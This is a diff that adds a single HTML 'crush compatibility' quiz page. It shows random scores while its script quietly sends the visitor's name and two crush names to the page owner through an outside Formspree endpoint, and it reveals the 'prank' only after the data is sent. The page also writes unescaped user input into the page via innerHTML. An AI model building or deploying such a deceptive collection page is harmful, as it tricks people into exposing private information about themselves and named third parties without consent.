@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>How compatible are you with your crush?</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .input-container {
+            margin-bottom: 10px;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 15px;
+            cursor: pointer;
+        }
+        .result {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>How compatible are you with your crush?</h1>
+    <form id="nameForm" action="https://formspree.io/f/xwpkppla" method="POST" onsubmit="return generateRandomNumbers(event)">
+      <div class="input-container">
+        <label for="name1">Enter your name: </label>
+        <input type="text" id="name1" name="name1" placeholder="Your name" required>
+      </div>
+      <div class="input-container">
+        <label for="name2">Enter Your Crush 1 name: </label>
+        <input type="text" id="name2" name="name2" placeholder="Crush 1 Name" required>
+      </div>
+      <div class="input-container">
+        <label for="name3">Enter Your Crush 2 Name: </label>
+        <input type="text" id="name3" name="name3" placeholder="Crush 2 Name" required>
+      </div>
+      <button type="submit">Your Compatibility is</button>
+    </form>
+    <div class="result" id="result"></div>
+
+    <script>
+        function generateRandomNumbers(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Get input values
+            const name1 = document.getElementById('name1').value;
+            const name2 = document.getElementById('name2').value;
+            const name3 = document.getElementById('name3').value;
+
+            // Generate random numbers between 0 and 100
+            const randomNumber1 = Math.floor(Math.random() * 101);
+            const randomNumber2 = Math.floor(Math.random() * 101);
+            const randomNumber3 = Math.floor(Math.random() * 101);
+
+            // Display the result
+            document.getElementById('result').innerHTML = `
+                <p>${name2}: ${randomNumber2}</p>
+                <p>${name3}: ${randomNumber3}</p>
+            `;
+
+            // Prepare data for Formspree
+            const formData = new FormData(event.target);
+            formData.append('randomNumbers', JSON.stringify([randomNumber1, randomNumber2, randomNumber3]));
+
+            // Send data to Formspree
+            fetch(event.target.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    alert("You have been pranked! Names are sent to the website's owner!");
+                } else {
+                    alert('There was an error sending the names. Please try again.');
+                }
+            });
+        }
+    </script>
+
+</body>
+</html>
